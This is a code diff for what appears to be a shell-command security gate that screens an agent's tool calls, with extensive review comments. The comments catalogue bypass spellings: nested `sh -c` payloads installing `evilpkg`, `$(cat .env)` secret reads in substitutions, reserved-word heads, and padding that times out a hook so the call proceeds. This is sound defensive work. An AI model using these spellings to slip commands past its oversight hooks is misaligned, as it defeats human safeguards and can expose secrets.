+# [round-2 review F-870] A shell invoker's argument is a COMMAND LINE, not
+# prose, so its quoted run is re-parsed; every other command's quoted run stays
+# one opaque candidate. Deciding this on WHO THE COMMAND IS - rather than on
+# what the run looks like - is what lets `sh -c 'cat secrets/prod.yaml'` block
+# while `git commit -m "fix the .env loader"` stays allowed.
+#
+# [round-4 D3] `_SHELL_INVOKERS` and `_CMD_PREFIXES` are no longer WRITTEN
+# here. They are interpolated from lib/cmdpos.py into the emitted prelude,
+# together with `_CMD_PFX_RE`, because a comment claiming "kept in sync with
+# CMD_PFX / _cs_isinv on the shell side" is worth nothing: `_CMD_PFX_RE` sat
+# byte-identical to the previous commit while its shell twin grew, over a
+# comment reading "Shell parity: this is CMD_PFX from the shell header, same
+# alternation in the same order". Twelve spellings diverged - `setsid pip
+# install evilpkg`, `doas git commit -m x` and ten more allowed here and
+# denied there. Interpolation is what makes the claim structural.
+#
+# Defined in the emitted prelude (see sdk_gates_module):
+#   _SHELL_INVOKERS   _CMD_PREFIXES   _CMD_PFX_RE   _INT_INVOKERS
+
+
+# Two operator sets, mirroring the two the shell carries, because the two
+# consumers need different things and the shell is the contract:
+#   _SECRETS_OPS = the gate's _sg_raw. `<` and `>` delimit a WORD there, so
+#     `base64 <.env` yields `.env`.
+#   _CMD_OPS = the header's _cs_ops. Redirections are NOT separators there;
+#     they are skipped by _CMD_PFX_RE at command position instead, so
+#     `>/dev/null pip install evil` keeps `pip install` at the head of its
+#     segment. A backtick IS a separator - it runs its contents.
+_CS_WS = "\\002"
+# [round-4 D5] How many times an invoker's argument is re-expanded, with the
+# invoker test RE-APPLIED at each level. Stated once, both substrates, and
+# asserted equal by tests/test_composition.py.
+#
+# The round-4 brief prescribes 2 on the strength of a measurement that "depth
+# 3 added nothing observable". That measurement was taken against the BROKEN
+# scanner - the one that desynced on a backslash-escaped quote - so the third
+# level it was looking for had already been mis-parsed away. With the scanner
+# fixed, 3 is load-bearing and the executed case is the corpus's NST-01:
+#
+#   bash -c 'sh -c "echo x; sh -c '"'"'pip install evilpkg'"'"'"'
+#
+# which is three nested shells and is recorded as PROVEN TO EXECUTE ("PIP RAN:
+# install evilpkg" with a fake pip on PATH). At 2 the innermost argument is
+# reached but never split, so `pip install evilpkg` stays one flattened token
+# and no install head matches. Where this document and an executed result
+# disagree, the executed result wins.
+#
+# 4 was BUILT AND MEASURED on both substrates and changed no verdict on the
+# round-4 probe corpus: a fourth level needs four nested quoting contexts,
+# which no reachable spelling produces.
+_EXPAND_DEPTH = 3
+# [item 1] What bounds the quote-aware command-substitution walk
+# (_subst_inners) when it lifts `$(...)`/backtick bodies out of a double-quoted
+# run. Fail-closed either way: the run itself is still flattened and scanned, so
+# a substitution beyond a bound is simply not ADDITIONALLY re-parsed; it never
+# becomes an allow the walk would otherwise deny.
+#
+# [B3] This was ONE number, `_SUBST_MAXLEN`, used as a prefix cap - which made
+# whether a substitution got walked depend on how much text PRECEDED it, i.e. on
+# something the attacker writes (backlog X-44). It is now a flat semantic BUDGET
+# plus a cost-only length backstop. The shell twins (`_SUBST_BUDGET` /
+# `_SUBST_SCANMAX` in the header) carry the SAME numbers so neither substrate can
+# hit its runtime timeout while the other completes on a large command (the
+# X-36l exhaustion-divergence hazard). [CORRECTED 2026-08-13, X-51: "fail-closed
+# timeout" - a cancelled hook does not deny, it is skipped and the call proceeds.
+# The divergence hazard is unchanged; only the direction of the harm is.]
+# Asserted equal by test_composition.
+_SUBST_BUDGET = 8192
+# [B3 re-land] 16384, not the first attempt's 65536. That value was sized by a
+# sweep that padded OUTSIDE the substitution, holding the lifted inner at 16
+# bytes while varying only the walk's reach - but gate cost is the RE-SCAN of
+# the lifted inner, so it scales with the INNER. Re-measured with the padding
+# INSIDE, 65536 TIMES OUT and 32768 costs 111 s against a 60 s
+# ceiling; 16384 costs 30.9 s. The shell twin carries the identical number and
+# test_composition compares the two directly - an unequal pair is the X-36l
+# exhaustion-divergence hazard, and it is not theoretical: measured with the
+# shell at 16384 and this side still at 65536, `echo "<20000 x>$(cat .env)"` is
+# shell-allow / SDK-deny.
+_SUBST_SCANMAX = 16384
+# [B3] The characters `_subst_inners` charges its budget for, and the SHELL
+# twin's `case` in _cs_subst_scan is spelled from the same five. They are the
+# only ones in both walkers' dispatch UNCONDITIONALLY; `#`, `}`, `(` and `)`
+# are all conditional and the conditions differ between substrates, which is
+# where the first attempt's two parity bugs came from. See the shell's charge
+# site for the full argument.
+_SUBST_CHARGED = ("\\\\", '"', "'", "`", "$")
+_SECRETS_OPS = ";&|()<>\\n"
+_CMD_OPS = ";&|()`\\n"
+
+
+def _quoted_runs(cmd):
+    r"""Every quoted run in `cmd`, contents only. No regex, so there is no
+    escaping question about what the pattern means.
+
+    [round-4 D5] Backslash-aware. It was not, and that is D5's actual root
+    cause - an earlier diagnosis blamed recursion DEPTH, a reviewer built
+    depth-3 recursion, and two of D5's three reproductions still allowed
+    because the scanner was desyncing on `\"` before recursion ever ran.
+    Exactly one level of quote removal is performed on the run, which is what
+    the shell does and what lets the next level see the inner quotes of
+    `bash -c "sh -c \"pip install evil\""`.
+    """
+    runs, cur, quote, esc = [], [], None, False
+    for ch in cmd:
+        if esc:
+            cur.append(ch)
+            esc = False
+        elif ch == "\\\\" and quote != "'":
+            esc = True                     # one level of quote removal
+        elif quote:
+            if ch == quote:
+                runs.append("".join(cur))
+                cur = []
+                quote = None
+            else:
+                cur.append(ch)
+        elif ch in ("'", '"'):
+            quote = ch
+    if cur:
+        runs.append("".join(cur))
+    return runs
+
+
+def _tok_words(tok):
+    r"""EVERY basename spelling of `tok` a shell walker can see, deduplicated.
+
+    FOUR, not one, because there are THREE shell readings of one token and this
+    function feeds walks that mirror all of them:
+
+      `_cs_isinv`  (all 13 hooks, via `_CS_BUF`)  quotes DROPPED, escape kept
+      `_sg_push`   (secrets-gate)                 quotes KEPT, escape STRIPPED
+      raw text                                    neither
+
+    `_invoker_at` feeds BOTH the dependency walk and the secrets walk, so no
+    single spelling can match both shell walkers, and any spelling a shell
+    walker sees and this one does not is an SDK-MORE-PERMISSIVE split - the one
+    direction this module's contract forbids. So read all of them and OR the
+    answers.
+
+    THE COST OF EACH REJECTED ALTERNATIVE. Read the four figures below as what
+    they are: the measurement that CHOSE this spelling, taken with only
+    `_invoker_at`'s two INVOKER arms reading it and the prefix/assignment/flag
+    arm still raw. They are not a description of the residue this tree ships -
+    that arm reads the union too now (code-review 1, F1), and the residue is
+    re-derived at the bottom of this docstring. Measured on one corpus of
+    11,508 (command, gate) rows: 6,300 from 14 hostile head forms (bare, path,
+    dot-slash, double-quoted, single-quoted, part-quoted, empty-quote-tail,
+    unbalanced quote in three positions, single and double escape-prefixed,
+    mid-word escape, quoted path) x 10 invokers x 5 suffixes x 9 payloads,
+    plus 5,208 more putting the same heads behind wrappers (`sudo`, `env A=1`,
+    `nice -n 10`, `timeout -k 1 -s KILL 5`, `nohup`). Every candidate was
+    driven against the IDENTICAL shell half:
+
+      raw token only                   1926 new SDK-more-permissive rows
+      quote-stripped, refuse on an
+        odd quote count                 721
+      quote-and-escape-stripped only    440
+      THE UNION, as written here        440
+
+    The quote-stripped spelling's extra 281 rows over the union are exactly the
+    double-escape head class, which it cannot see because `_sg_push` strips
+    escapes and it keeps them. Its "refuse rather than strip on an odd quote
+    count" rule is also what made a shell walker resolve a head this one
+    returned nothing for, so it is dropped: refusing to answer is not the safe
+    direction when the other substrate answers.
+
+    NOT A NEW CONVENTION. `_segment_candidates`'s unbalanced-quote fallback
+    already emits exactly these four twins for exactly this reason - "THREE
+    twins, not two ... Additive and deduplicated, so the raw token stays a
+    candidate (deny-list bias is over-match)". The head scan now uses the rule
+    the candidate walk has used all along.
+
+    THE RESIDUE ON THE TREE THAT SHIPS, re-derived after the last edit, base
+    (v2.7.2) vs this tree, on a deny-capable fixture (project commands
+    failing, a git repo with two commits and a staged file under an enforced
+    prefix; `CLAUDE_PROJECT_DIR` set for BOTH substrates, without which
+    eval-gate and spec-gate-commit are not deny-capable at all and every one
+    of their shell denies is reported as a phantom split):
+      6,480-row wrapper matrix   0 new SDK-more-permissive, 0 deny->allow
+      6,480-row narrowing sweep  assignment and flag tokens whose value
+                                 carries a slash / colon / `=`, quoted and
+                                 escaped, versioned and not: 0 either way -
+                                 the sweep that catches `_tok_forms` being
+                                 collapsed back into `_tok_words`
+      9,100 shell + 4,900 SDK    350 payloads x 13 hooks and x 7 gates x 2
+                                 installs: 0 deny->allow, 6 hooks and 5 gates
+                                 move, 7 hooks bytes-only
+      4,000-row hostile-head     0 new SDK-more-permissive, 0 deny->allow;
+                                 200 pre-existing forbidden rows CLOSED,
+                                 1,000 new tolerated (800 versioned, 200 not)
+      31,250-row mechanism grid  2,040 new forbidden, 0 deny->allow - the
+                                 X-36x class, every row refused by `bash -n`
+                                 (0 of 31,250 parse), every twin pre-split
+      2,959-name PATH census     0 moved bare; 7 moved double-quoted, all 7
+                                 exact ALL_INVOKERS members closing a
+                                 pre-existing split
+      2,250 ordinary rows        0 moved, over quoted/escaped/part-quoted
+                                 heads on five gate pairs
+    """
+    out = []
+    for _w in _tok_forms(tok):
+        _w = _w.rsplit("/", 1)[-1]
+        if _w and _w not in out:
+            out.append(_w)
+    return out
+
+
+def _tok_forms(tok):
+    r"""The same four spellings, WITHOUT the basename step.
+
+    THE BASENAME IS NOT PART OF EVERY QUESTION, and conflating the two cost a
+    measured deny -> allow. `_tok_words` exists for questions about a PROGRAM,
+    where `/usr/bin/bash` and `bash` are the same answer; `_invoker_at` also
+    asks two questions about a TOKEN - is it an assignment, is it a flag - and
+    a basename is the wrong reading for both, because the thing after the `=`
+    or the `-` may itself contain a slash:
+
+        FOO=/usr/lib/x bash -c "pip install evil"
+
+    `_ASSIGN` matches that token and `_invoker_at` walks past it to `bash`.
+    Basename it first and you get `x`, which is neither an assignment nor a
+    flag, so the walk stops dead and the payload is ALLOWED. Measured on a
+    deny-capable fixture, five such rows went SDK-deny -> SDK-allow when this
+    distinction was missing - the one direction this module's contract rules
+    out, introduced by the very edit that closed a different split. The rule
+    that keeps it from happening again: every arm must read a SUPERSET of what
+    it read before, so the assignment and flag arms read `_tok_forms` UNION
+    `_tok_words` (the shell basenames its `_b`, so its reading has to stay in
+    the set too) and never `_tok_words` alone.
+    """
+    stripped = tok.replace("'", "").replace(chr(34), "")
+    out = []
+    for _w in (tok, stripped, tok.replace(chr(92), ""),
+               stripped.replace(chr(92), "")):
+        if _w and _w not in out:
+            out.append(_w)
+    return out
+
+
+def _invoker_at(toks):
+    r"""Index of the shell invoker at the head of `toks`, or None.
+
+    [round-4 D8] THE single head scan. There were TWO, and the round-4
+    prescription touched one: `_expand_invoker_args` fed dependency-gate while
+    `_segment_candidates` carried its own inline whitespace split for
+    secrets-gate. A reviewer implemented the whole prescription and the
+    candidate set for `bash -c "cat 'secrets/...'"` was BYTE-IDENTICAL before
+    and after, because the fix landed in the copy that gate does not use.
+    Both callers now ask this function.
+
+    [round-4 D1/D2/D7] THE BOUND IS GONE. `saw_prefix and i < 4` could not
+    reach the invoker behind `timeout -k 1 -s KILL 5 sh -c` (five tokens) or
+    `env A=1 B=2 C=3 D=4 sh -c`. The replacement is not an arity table - one
+    was built and measured to regress 16 of 27 real wrapper-flag spellings,
+    mostly LONG forms of flags whose short form was in the table. Once a
+    wrapper word is seen, skip until an invoker turns up or the tokens run
+    out; `grep -r sh f` never starts the skip because `grep` is not a wrapper,
+    which is the whole safety argument. See lib/cmdpos.py.
+    """
+    saw_prefix = False
+    for i, tok in enumerate(toks):
+        # [issue #54 / X-36q, code-review 1 F1] Computed ONCE and read by
+        # EVERY arm. The first cut normalised the two invoker arms and left
+        # the prefix/assignment arm on a raw `tok.rsplit("/", 1)[-1]`, which
+        # is the same "one question, N token spellings" defect this function
+        # was rewritten to close, one arm over - and measurably worse than the
+        # residue that WAS disclosed, because bash EXECUTES it (verified with
+        # fakes on PATH: `"sudo" bash5.2 -c "pip install evil"` really runs
+        # sudo). 5,520 rows of a 6,480-row quoted-wrapper matrix were
+        # shell-DENY / SDK-ALLOW on dependency-gate; 0 after. The shell has no
+        # such split to mirror: `_cs_isinv` hands every arm the same
+        # quote-stripped `_b` and `_sg_push` the same escape-stripped one, so
+        # ONE `words` for the whole cascade is the parity, not an optimisation.
+        #
+        # TWO READINGS, NOT ONE, and the second is not tidiness: `words` is
+        # basenamed and `forms` is not. An arm asking "is this a PROGRAM"
+        # wants the basename; the assignment and flag arms ask about the WHOLE
+        # TOKEN, whose right-hand side can carry a slash of its own
+        # (`FOO=/usr/lib/x`, `--file=/x/y`, `-o/x/y`). Feeding those two arms
+        # `words` alone basenames the value away, the walk stops, and the
+        # payload behind the wrapper is allowed - five measured SDK
+        # deny -> allow rows. Both arms therefore read `forms + words`, which
+        # is a strict superset of the raw token they read before AND of the
+        # shell's basenamed `_b`.
+        words = _tok_words(tok)
+        forms = _tok_forms(tok) + words
+        # An invoker is tested FIRST so a DUAL word (watch/xargs/ssh, both a
+        # transparent prefix and a thing whose argument is a command line)
+        # reports here rather than being skipped past.
+        # [issue #54 / X-36q] ONE question, so ONE spelling set, in BOTH arms.
+        # Left raw, this arm is SDK-more-permissive on every quoted or
+        # escape-prefixed spelling of a DUAL word: `"ssh" h "pip install evil"`
+        # is shell-deny / SDK-allow at v2.7.2, and bash really does EXECUTE ssh
+        # for that spelling. Normalising here closes those rows and takes the
+        # structural pin to zero mismatches against both shell readings.
+        # EXACT membership, no reduction: `sshd` normalises to `sshd`, which is
+        # in no set, so the objection that killed an ALL_INVOKERS-scoped
+        # REDUCTION does not apply to an ALL_INVOKERS-scoped normalisation.
+        if any(_w in _SHELL_INVOKERS for _w in words):
+            return i
+        # `_INT_INVOKERS` (cmdpos.INVOKERS), NOT `_SHELL_INVOKERS`: `_int_word`
+        # returns only INTERPRETERS members and the DUAL words are not among
+        # them, so this is the exact set this arm can ever see - naming the
+        # wider one would be round-4 D3. `_INV_WORD_MAX` is the shell twin's
+        # NAME_MAX bound, rendered from the same cmdpos number so the two
+        # substrates cannot disagree about which words are too long to be
+        # programs. Shell parity: `_cs_inv_word`.
+        if any(len(_w) <= _INV_WORD_MAX and _int_word(_w) in _INT_INVOKERS
+               for _w in words):
+            return i
+        # [X-36v] A RESERVED WORD IS NOT THE COMMAND WORD, and this walk did
+        # not know that for any of ten spellings. Every one of these is
+        # allow/allow at v2.7.3 and every one really runs, verified with a fake
+        # `pip` on PATH:
+        #
+        #   { bash -c "pip install evil"; }         ! bash -c "..."
+        #   if bash -c "..."; then :; fi            while bash -c "..."; do ...
+        #   if true; then bash -c "..."; fi         until bash -c "..."; do ...
+        #   if false; then :; else bash -c "..."; fi
+        #
+        # while the SUBSHELL twin `( bash -c "..." )` denies on both
+        # substrates - because `(` is a segment break in `_shell_segments` and
+        # `{` is not. The gap is the head form, not the invoker.
+        #
+        # AFTER the two invoker arms, so a DUAL word still reports its index
+        # rather than being skipped past, and BEFORE the prefix arm because
+        # this is the narrower answer: `continue` WITHOUT setting `saw_prefix`,
+        # so an ordinary word after a reserved one still ends the walk. That
+        # matters - `{ pip install evil; }` must NOT make this function claim
+        # an invoker; the ANCHOR is what denies that one, and it already does.
+        #
+        # Same DENY-ONLY argument as the arms below: this only continues a walk
+        # that would otherwise `return None`, and every caller consumes
+        # `toks[idx+1:]`, so it can turn None into an index and can never turn
+        # one index into a later one.
+        if any(_w in _HEAD_TRANSPARENT for _w in forms):
+            continue
+        # DENY-ONLY, by the same argument as the two arms above and stated
+        # here because this arm WIDENS a skip rather than adding a return:
+        # `saw_prefix` only continues a walk that would otherwise
+        # `return None`, and every caller consumes `toks[idx+1:]`, so a wider
+        # skip can turn None into an index and can never turn one index into
+        # a later one. Fence unaffected - `grep -r sh f`, `"grep" -r sh f`,
+        # `ls bash5.2` and `frobnicate bash5.2 -c x` all still return None,
+        # because `grep`/`ls`/`frobnicate` are in no spelling of _CMD_PREFIXES.
+        # [X-36v] `_NAMED_GROUP_HEADS` joins this arm rather than the skip arm
+        # above, because `function` and `coproc` put a NAME between themselves
+        # and the group - `function f { bash -c "pip install evil"; }; f` runs,
+        # and a one-token skip stops dead on `f`. Wrapper semantics (skip until
+        # an invoker turns up) is what reaches it, and it is the semantics that
+        # already exists here. `coproc bash -c "..."` with no name at all also
+        # runs, and the same arm covers it.
+        if (any(_w in _CMD_PREFIXES or _w in _NAMED_GROUP_HEADS
+                for _w in words)
+                or any(_ASSIGN.match(_w) for _w in forms)):
+            saw_prefix = True
+            continue
+        # ...and the flag arm reads the same union, for the same reason: the
+        # shell tests `-*` against its ONE stripped `_b`, so `"-x" bash5.2 -c
+        # ...` walks past the flag there and stopped dead here. Bounded on
+        # that spelling (a leading `-x` is not a program, so bash executes
+        # nothing) but it is the same class, it costs one `any()`, and the
+        # direction is identical: a flag `continue`s without setting
+        # `saw_prefix`, so the walk still ends in `return None` unless a real
+        # invoker turns up.
+        if any(_w.startswith("-") for _w in forms):
+            continue                       # a flag is never the command word
+        if saw_prefix:
+            continue                       # a wrapper's own operand
+        return None                        # an ordinary command at the head
+    return None
+
+
+def _flatten_seg(seg):
+    r"""Drop quote characters and turn whitespace inside a quoted run into a
+    non-space sentinel, so the run stays one token for the `\\S+` patterns.
+    Applied AFTER invoker expansion, which needs the quotes to find the
+    argument. Shell parity (cmd_segments' _CS_WS handling).
+
+    [round-4 D10] The `r` prefix is load-bearing. Without it this docstring
+    raised `SyntaxWarning: "\\S" is an invalid escape sequence` in the EMITTED
+    module - and under `-W error::SyntaxWarning`, or a future Python where
+    the warning hardens into an error, the import fails and every SDK gate
+    is disabled at once. Nothing compiled the emitted artifact, so the golden
+    digest simply re-baselined over it. tests/test_sdk_gates.py now compiles
+    the rendered source under `-W error`; prefer `r` on any docstring here
+    that names a regex."""
+    out = _shell_segments(seg, "", flatten=True)
+    return out[0] if out else ""
+
+
+def _expand_invoker_args(segs):
+    """A shell invoker's quoted argument is a COMMAND LINE, so segment it
+    too. Shell parity (_cs_isinv / _CS_EXTRA in the shared header).
+
+    [round-3 lens A, A1] Without this, `sh -c 'true; pip install evil'`
+    reached dependency-gate as ONE segment headed by `sh`, no install verb
+    was ever at command position, and the install ran. Both substrates
+    agreed on allow, so the differential could not see it. The J-7
+    retirement that made quoted separators non-splitting is correct for
+    prose and false for an invoker: `sh -c` really does run its argument.
+    Additive - the original segment is kept as well.
+
+    [round-4 D5] DEPTH 2, re-applying the invoker test at EACH level. Depth 3
+    was implemented and measured to add nothing observable. The thing that is
+    easy to get wrong, and that would be worse than leaving D5 open: expanding
+    every quoted run instead of RE-TESTING the invoker. That re-opens J-7 and
+    lens B finding 4 wholesale - prose in a commit message becoming a command
+    line - so the recursion carries the test with it.
+    """
+    out, frontier, depth = list(segs), list(segs), 0
+    while frontier and depth < _EXPAND_DEPTH:
+        nxt = []
+        for seg in frontier:
+            if _invoker_at(seg.split()) is not None:
+                for inner in _invoker_arguments(seg):
+                    if inner.strip():
+                        nxt.extend(_shell_segments(inner, _CMD_OPS))
+            # [item 1] A `$(...)`/backtick inside double quotes is a command
+            # line bash executes; lift and re-segment it, in the SAME frontier
+            # as the invoker arm so a substitution wrapping an invoker
+            # (`echo "$(sh -c 'pip install evil')"`) and an invoker wrapping a
+            # substitution both resolve. Shell parity: _cs_subst_scan feeding
+            # _CS_EXTRA, which cmd_segments drains in the same recursion.
+            for inner in _subst_inners(seg):
+                if inner.strip():
+                    nxt.extend(_shell_segments(inner, _CMD_OPS))
+        out.extend(nxt)
+        frontier = nxt
+        depth += 1
+    return out
+
+
+def _invoker_arguments(seg):
+    r"""Every argument of an invoker-headed segment that is a COMMAND LINE.
+
+    Two sources, because an invoker's argument is one shell WORD and there is
+    more than one way to spell one:
+
+      quoted   sh -c 'pip install evil'      -> _quoted_runs
+      escaped  sh -c pip\\ install\\ evil      -> shlex
+
+    [round-4 D5, third reproduction] Only the first source existed, so the
+    escaped spelling had no quoted run to expand and reached dependency-gate
+    as one opaque segment - `shell=0, SDK=0`, and it EXECUTES. An earlier
+    diagnosis attributed all of D5 to recursion depth; depth cannot help a
+    shape that produces nothing to recurse into.
+
+    shlex is best-effort: it refuses an unbalanced quote, and on that path the
+    quoted source has already contributed. Additive, never a replacement.
+    """
+    found = list(_quoted_runs(seg))
+    try:
+        toks = shlex.split(seg, posix=True)
+    except ValueError:
+        return found
+    idx = _invoker_at(toks)
+    if idx is None:
+        return found
+    for tok in toks[idx + 1:]:
+        if any(c.isspace() for c in tok) and tok not in found:
+            found.append(tok)
+    return found
+
+
+def _shell_segments(cmd, ops=_SECRETS_OPS, flatten=False):
+    """Split on UNQUOTED operators and newlines -> the units at which a new
+    command can begin.
+
+    Quote-aware, so a `;` or a newline INSIDE a quoted argument does not
+    start a new command. Two things depend on that:
+
+      * command position, which the invoker rule keys on. shlex.split
+        discards newlines along with every other whitespace run, so an
+        `sh -c` on the second LINE of a command reached its token with the
+        tracker already past command position, the invoker rule never
+        fired, and the SDK would have allowed what the shell blocks - the
+        exact direction this module's binding rule forbids.
+      * not splitting quoted tokens on operators. The previous version ran
+        _SH_OPS.split over every shlex token, so `git commit -m "refactor
+        (parse .env) handling"` was torn into parts and denied while the
+        shell allowed it. Operators are handled HERE, before quotes are
+        removed, so a token that still contains one was quoted and is left
+        whole.
+
+    An unterminated quote takes the rest of the string as one segment,
+    which is what the shell gate does.
+    """
+    # [round-3 lens A, A5] `flatten` mirrors the shell's cmd_segments: the
+    # whitespace INSIDE a quoted run becomes a non-space sentinel so the run
+    # stays ONE token (every option-run and assignment pattern is built from
+    # `\\S+`, and a quoted value containing a space otherwise ends the run
+    # early), and the quote characters are dropped so `"pip" install evil`
+    # reaches the tool matcher. Off for the secrets tokenizer, which hands
+    # its output to shlex and needs the quotes intact.
+    # [round-4 D5] Backslash-aware, on both paths. Without it `bash -c "sh -c
+    # \"pip install evil\""` desynced the scanner - the escaped quote closed
+    # the run - so the outer argument was read as `sh -c \\` and everything
+    # after it fell outside any quote. An escaped separator was likewise
+    # treated as a separator, which splits a command the shell would not.
+    # `flatten` keeps the escaped character and drops the backslash (the run
+    # is being reduced to one token anyway); the shlex path keeps both,
+    # because shlex performs its own quote removal downstream.
+    segs, cur, quote, esc = [], [], None, False
+    for ch in cmd:
+        if esc:
+            esc = False
+            # [round-4] An ESCAPED character is emitted literally, including a
+            # space - it is NOT the same as whitespace inside a quoted run.
+            # Mapping it to _CS_WS glued `\\ pip\\ install\\ evil` into one token
+            # and no install head could match it, so the SDK allowed what the
+            # shell denied. The shell restores escapes to real characters when
+            # it emits a segment (_cs_esc_restore); this is that parity. Found
+            # by the backslash axis the round-4 composition sweep adds.
+            cur.append(ch)
+        elif ch == "\\\\" and quote != "'":
+            esc = True
+            if not flatten:
+                cur.append(ch)
+        elif quote:
+            if ch == quote:
+                quote = None
+                if not flatten:
+                    cur.append(ch)
+            elif flatten and ch.isspace():
+                cur.append(_CS_WS)
+            else:
+                cur.append(ch)
+        elif ch in ("'", '"'):
+            quote = ch
+            if not flatten:
+                cur.append(ch)
+        elif ch in ops:
+            segs.append("".join(cur))
+            cur = []
+        else:
+            cur.append(ch)
+    if esc and not flatten:
+        pass                    # a trailing backslash is already in `cur`
+    segs.append("".join(cur))
+    return [s for s in segs if s.strip()]
+
+
+def _subst_inners(seg):
+    r"""Every COMMAND SUBSTITUTION whose output bash executes because it sits in
+    an ACTIVE quoting context - i.e. `$(...)` / `` `...` `` inside DOUBLE quotes
+    or unquoted, but NOT inside single quotes (which suppress it). Returns each
+    one's inner text as a command line, for the caller to re-segment. Shell
+    parity: the header's `_cs_subst_scan` / `_CS_SUBST_R`.
+
+    [item 1] `echo "$(cat .env)"` reads a secret and `echo "$(pip install evil)"`
+    installs, because bash runs the substitution; neither segmenter walked into
+    it, so both were allow/allow on both substrates.
+
+    It is a SINGLE quote-and-escape-aware char-walk, NOT a per-run extractor:
+      * per-run extraction tears at the inner `"` of `echo "$(cat ".env")"` -
+        which bash executes, because `$(...)` RESETS the quoting context - and
+        pulls an unbalanced `$(cat `. So the walk models the reset: once inside
+        `$(...)`/backtick it matches to the balanced close QUOTE-BLIND (parens
+        are still balanced, escaped chars skipped), and a `'` inside a `"` run
+        stays a literal, not a quote.
+      * a `$`/backtick preceded by an ODD number of backslashes is escaped and
+        INERT (`echo "\\$(cat .env)"` prints a literal `$(...)`), so the walk
+        skips a backslash-and-its-successor as a pair - which also makes an even
+        run of backslashes leave the opener live.
+    [B3] TWO BOUNDS, both matching the shell twin's number. `_SUBST_BUDGET` is
+    the semantic one: one unit per `_SUBST_CHARGED` character met in THIS loop,
+    and the walk stops when it runs out. It is FLAT - not derived from
+    len(seg) - precisely because this function is called on the command, on each
+    SEGMENT and on each TOKEN while the shell twin is not, so any length-derived
+    budget would hand the two substrates different allowances for the same text.
+    `_SUBST_SCANMAX` is the cost one, a plain prefix bound for input made
+    entirely of characters nothing charges.
+
+    The walk therefore always reaches at least byte `_SUBST_BUDGET` (each charge
+    consumes >= 1 character), which is what the old prefix cap guaranteed, and
+    padding beyond `_SUBST_SCANMAX` returns to the old prefix-cap behaviour -
+    the hole moves from ~8 KB to ~64 KB, it does not close.
+    """
+    # [X-47] BYTES, not code points, so this agrees with the shell twin in
+    # EVERY locale. `seg[:N]` counts code points; the shell's `${_s:0:N}` counts
+    # whatever the ambient locale says. That split was measured live -
+    # 6000 x U+4E2D of padding is shell-ALLOW / SDK-DENY with no locale set -
+    # and the unit chosen is BYTES because characters are unaffordable: a
+    # 16384-CHARACTER multibyte walk costs 74.4 s against a 60 s
+    # ceiling. `surrogatepass` for `budget_len`'s reason - a command arrives
+    # through JSON and a lone surrogate must weigh the same here as it does to
+    # bash rather than crash a PreToolUse hook. The decode is trimmed back to a
+    # whole character because a byte cut can land mid-sequence; the shell keeps
+    # those trailing bytes and this side drops them, and an incomplete sequence
+    # cannot open or close a substitution, so no arm of either walk can see the
+    # difference.
+    _sb = seg.encode("utf-8", "surrogatepass")
+    if len(_sb) > _SUBST_SCANMAX:
+        _sb = _sb[:_SUBST_SCANMAX]
+        while _sb:
+            try:
+                seg = _sb.decode("utf-8", "surrogatepass")
+                break
+            except UnicodeDecodeError:
+                _sb = _sb[:-1]
+        else:
+            seg = ""
+                                  # bound the WHOLE walk (openers AND the paren
+    budget = _SUBST_BUDGET
+    out, i, n, quote = [], 0, len(seg), None   # balance) to a fixed prefix, so
+    wstart = True                 # `#` opens a comment only at a WORD START
+    # [B5 review] A heredoc BODY is not shell code: inside an UNQUOTED `<<EOF`
+    # body a line-leading `#` is ordinary text and bash STILL expands `$(...)`.
+    # Reading it as a comment invents one and drops a live substitution, so the
+    # `#` rule is off for any command carrying a heredoc opener (backlog X-42).
+    # `<<<` is a herestring - one word, no body - and is removed before the
+    # test rather than tripping it. Shell parity: `_hd` in _cs_subst_scan,
+    # computed there on the same already-truncated string.
+    heredoc = "<<" in seg.replace("<<<", "")
+    # [X-46 / X-49] THE MIRROR IS STILL NOT SAFE, AND THE REASON MOVED. It was
+    # first reverted because the two walkers truncated over different UNITS;
+    # X-47 pinned both to UTF-8 bytes and it was re-applied - and measured
+    # WRONG a second time, for a different reason: they truncate over different
+    # DOMAINS. The shell runs its walk ONCE, on the whole command, and byte-
+    # truncates there; this side runs again on EVERY SEGMENT, each with its own
+    # window starting at its own offset 0. So a segment beginning past the
+    # shell's cap is untruncated HERE and invisible THERE, its `<<` sets this
+    # flag and not `_hd`, and the mirror hands this side a budget the shell
+    # never gets. Measured, pure ASCII, locale-independent:
+    # `echo ` + 17000 `a` + `; echo "a<<b" ` + 9000 `$` + `"$(cat .env)"` is
+    # allow/allow without the mirror and shell-ALLOW / SDK-DENY with it - the
+    # forbidden direction, manufactured by the parity fix. The control with
+    # `axxb` in place of `a<<b` is allow/allow either way, which is what pins it
+    # to the flag rather than to the length. Blocked on X-49.
+    bd = 0                        # unquoted `${...}` nesting depth
+    while i < n:                  # the shell twin's O(n^2) walk cannot time out
+        ch = seg[i]              # while this O(n) one completes (parity by cap)
+        # [B3] THE CHARGE, and it sits HERE - at the top of the OUTER loop,
+        # before any arm - so it bills exactly the characters the shell twin's
+        # jump set stops on, in every quote state, once each. The balance loops
+        # below are separate `while`s this line never runs for, which is what
+        # keeps the backtick loop's off-by-one (it exits ON the closing backtick
+        # and skips it, while the shell CONSUMES it) from becoming a 2-vs-1
+        # charging split.
+        if ch in _SUBST_CHARGED:
+            budget -= 1
+            if budget <= 0:
+                break
+        if ch == "\\\\" and i + 1 < n and quote != "'":
+            # A backslash-NEWLINE pair is a LINE CONTINUATION - bash deletes it,
+            # so the word-start state before it survives it. Clearing wstart
+            # here lifted an install out of a comment on the next line.
+            if seg[i + 1] != "\\n":
+                wstart = False
+            i += 2                       # escaped char: skip it and its target
+            continue
+        if quote == "'":
+            if ch == "'":
+                quote = None
+            i += 1
+            wstart = False
+            continue
+        if quote != '"':
+            # Outside double quotes an unquoted `$(...)` / backtick is already
+            # a command position to the segmenters (the `(`/`)`/backtick
+            # operator breaks in _CMD_OPS), so this walk only LIFTS the ones
+            # hidden inside double quotes. A bare sub at command position that
+            # RUNS its own output is Class B, handled by the download-then-run
+            # rule, not here.
+            # [B5] An unquoted `#` that BEGINS a word opens a comment, and bash
+            # executes NOTHING in it. This walk runs BEFORE the trailing-comment
+            # strip (`seg.split(" #", 1)[0]` in _scan_install_line, the shell's
+            # `${_seg%% \\#*}`), so a verb inside a double-quoted substitution in
+            # a comment was lifted and matched: `git status  # ...
+            # "$(git push origin main)"` was DENIED by ci-mirror, which RUNS
+            # commands.ci_local first and has no override path. Skip to the
+            # newline, do NOT stop the walk - a comment ends at end-of-LINE and
+            # a multi-line command keeps executing, so breaking out here would
